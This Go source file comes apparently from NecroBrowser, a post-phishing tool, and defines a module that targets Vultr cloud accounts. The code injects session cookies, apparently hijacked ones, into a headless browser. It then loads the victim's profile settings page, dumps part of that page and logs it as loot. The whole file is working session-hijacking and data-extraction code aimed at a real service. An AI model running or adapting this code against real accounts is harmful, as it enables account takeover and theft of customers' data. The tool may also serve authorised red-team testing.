package vultr

import (
	"context"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/log"

	"github.com/muraenateam/necrobrowser/action/cookie"
	"github.com/muraenateam/necrobrowser/action/dom"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "Vultr"
)

type Vultr struct {
	zombie.Target

	URL        string
	ProfileURL string
}

type Extrusion struct {
	zombie.Extrusion

	Profile string
}

func NewVultr(target zombie.Target) *Vultr {

	target.Tag = zombie.GetTag(Name)
	return &Vultr{
		Target:     target,
		URL:        "https://my.vultr.com/",
		ProfileURL: "https://my.vultr.com/settings/#settingsprofile",
	}
}

// Name returns the action name
func (z *Vultr) Name() string {
	return Name
}

// SetTarget updates the zombie target object
func (z *Vultr) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *Vultr) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *Vultr) Instrument() (interface{}, error) {

	var (
		ext Extrusion
		err error
	)

	z.Debug("Instrumenting")
	a := action.Action{Target: z.Target}

	//
	// Set session Cookies
	//
	c := &cookie.Cookie{
		Action: a,
	}
	if err = c.SetSessionCookies(); err != nil {
		log.Error("Error setting session cookies: %v", err)
		return nil, err
	}

	var html string
	d := &dom.DOM{
		Action:   a,
		URL:      z.ProfileURL,
		Selector: `body > div:nth-child(9)`,
	}
	if err = d.DumpSelector(&html); err != nil {
		log.Error("Error retrieving DOM elements: %v", err)
		return nil, err
	}

	// ext.Profile = base64.StdEncoding.EncodeToString([]byte(html))
	log.Info("Profile page: \n%s", html)

	return ext, nil
}
